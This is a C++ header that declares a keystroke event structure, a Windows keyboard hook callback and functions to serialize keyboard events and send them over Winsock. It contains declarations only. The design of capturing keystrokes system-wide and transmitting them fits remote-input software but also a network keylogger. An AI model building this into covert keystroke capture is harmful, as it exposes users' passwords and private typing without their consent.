#pragma once
#include <WinSock2.h>

struct KeyEvent {
    bool isKeyDown;
    DWORD keyCode;
    bool ctrlPressed;
    bool shiftPressed;
    bool altPressed;
    bool winPressed;
};

void serializeEvent(const KeyEvent& event, char* buffer);
LRESULT CALLBACK keyboardHook(int code, WPARAM wParam, LPARAM lParam);
void sendKeyboardEvents();